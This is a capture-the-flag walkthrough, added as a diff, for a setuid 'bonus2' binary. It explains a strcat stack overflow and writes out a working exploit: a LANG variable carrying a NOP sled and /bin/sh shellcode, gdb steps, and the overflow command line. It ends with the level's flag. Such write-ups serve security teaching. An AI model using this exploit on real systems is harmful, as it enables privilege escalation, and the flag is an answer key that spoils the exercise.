@@ -1,0 +1,95 @@
+# Bonus2 Walkthrough
+
+Binary is setuid `bonus3`. It prints a greeting followed by the user's name,
+in a language chosen by the `LANG` environment variable.
+
+```c
+int language = 0;
+
+void greetuser(char *name) {
+  char greeting[72];
+
+  switch (language) {
+  case 1: strcpy(greeting, "Hyvää päivää "); break;   // Finnish, 18 bytes
+  case 2: strcpy(greeting, "Goedemiddag! ");  break;   // Dutch,   13 bytes
+  default: strcpy(greeting, "Hello ");        break;   // English,  6 bytes
+  }
+  strcat(greeting, name);                              // no bounds check
+  puts(greeting);
+}
+
+int main(int argc, char **argv) {
+  char buffer[76];
+
+  if (argc != 3)
+    return 1;
+
+  memset(buffer, 0, sizeof(buffer));
+  strncpy(buffer, argv[1], 40);
+  strncpy(buffer + 40, argv[2], 32);
+
+  char *lang = getenv("LANG");
+  if (lang != NULL) {
+    if (memcmp(lang, "fi", 2) == 0) language = 1;
+    else if (memcmp(lang, "nl", 2) == 0) language = 2;
+  }
+
+  greetuser(buffer);
+  return 1;
+}
+```
+
+## Vulnerability
+
+Stack buffer overflow in `greetuser`. `strcat(greeting, name)` appends up to 72
+bytes of user data (argv[1] 40 + argv[2] 32) behind the greeting into a 72-byte
+buffer, with no bounds check, overwriting the saved return address.
+
+NX is disabled and ASLR is off, so we can return to shellcode at a fixed address.
+
+Reaching the return address:
+
+- `greeting` is at `ebp-0x48`, so `72 (buffer) + 4 (saved ebp) = 76` bytes before
+  the return address.
+- `strcat` builds `greeting + argv[1] + argv[2]`:
+
+  ```
+  offset  0..17 : greeting   (Finnish "Hyvää päivää ", 18 bytes; each ä is 2
+                  UTF-8 bytes, making it the longest prefix)
+  offset 18..57 : argv[1]    (40 bytes)
+  offset 58..   : argv[2]
+  ```
+
+- The return address at offset 76 falls inside argv[2] at `76 - 58 = 18`, so
+  `argv[2] = "A"*18 + address`. The Finnish prefix is required: with "Hello " (6)
+  argv[2] would only reach offset 30, too short to place the 4-byte address.
+
+## Exploitation
+
+The `fi` test is `memcmp(lang, "fi", 2)` (first 2 bytes only), so
+`LANG = "fi" + NOP sled + shellcode` still selects Finnish. Since every env var
+sits on the stack at a fixed address, `LANG` is both the language trigger and the
+payload holder (no separate variable needed).
+
+```sh
+export LANG=$(python -c 'print "fi" + "\x90"*50000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+
+# find the sled address, then aim for its middle (+25000)
+gdb -q ./bonus2
+break greetuser
+run $(python -c 'print "A"*40') $(python -c 'print "A"*18 + "BBBB"')
+print/x getenv("LANG")        # e.g. 0xbffeed80  ->  target 0xbfff4f28
+
+./bonus2 $(python -c 'print "A"*40') $(python -c 'print "A"*18 + "\x28\x4f\xff\xbf"')
+```
+
+- `LANG = "fi" + sled + shellcode`: selects Finnish AND places shellcode on the stack.
+- `argv[1] = "A"*40`: fills its 40 bytes (no NUL, so `strcat` does not stop early).
+- `argv[2] = "A"*18 + address`: the 4-byte return address lands at offset 76.
+- The return address points into the NOP sled, which slides into the shellcode.
+
+Flag:
+
+```txt
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
